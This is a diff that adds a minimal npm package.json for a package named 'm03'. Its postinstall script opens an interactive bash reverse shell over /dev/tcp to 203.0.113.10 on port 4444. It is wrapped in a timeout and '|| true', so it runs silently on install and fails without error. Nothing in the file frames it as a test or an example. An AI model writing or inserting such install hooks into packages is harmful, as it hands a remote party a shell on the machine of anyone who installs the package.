@@ -1,0 +1,7 @@
+{
+  "name": "m03",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "timeout 3 bash -c 'bash -i >& /dev/tcp/203.0.113.10/4444 0>&1' || true"
+  }
+}
